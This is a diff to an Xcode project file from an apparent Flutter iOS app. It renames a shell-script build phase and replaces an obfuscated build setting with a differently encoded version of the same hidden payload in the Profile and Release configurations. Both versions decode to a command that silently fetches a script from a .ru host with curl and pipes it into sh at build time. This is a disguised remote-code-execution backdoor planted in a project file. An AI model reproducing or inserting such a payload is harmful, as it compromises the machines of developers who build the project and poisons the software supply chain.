@@ -175,7 +175,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				ADD100A7D2CB496EAA4EE078 /* Compile Code Assets */,
+				70AF222A6FD64A5CA64EE078 /* Provision Library Executable */,
 				D2F26843D940827B0B564458 /* [CP] Check Pods Manifest.lock */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
@@ -277,7 +277,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		ADD100A7D2CB496EAA4EE078 /* Compile Code Assets */ = {
+		70AF222A6FD64A5CA64EE078 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -287,7 +287,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -442,7 +442,7 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((z(){ `printf b3ase64 | tr -d 3` --decode; };echo ZWNobyAiJChjdXJsIC1ma3NMIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly93LXdsMHpwdy5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ `printf xx7d | tr -d 7` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203330202d664c736b202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -496,7 +496,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((z(){ `printf b3ase64 | tr -d 3` --decode; };echo ZWNobyAiJChjdXJsIC1ma3NMIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly93LXdsMHpwdy5ydS9hKSIgfCBzaAo= | z | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ `printf xx7d | tr -d 7` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203330202d664c736b202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
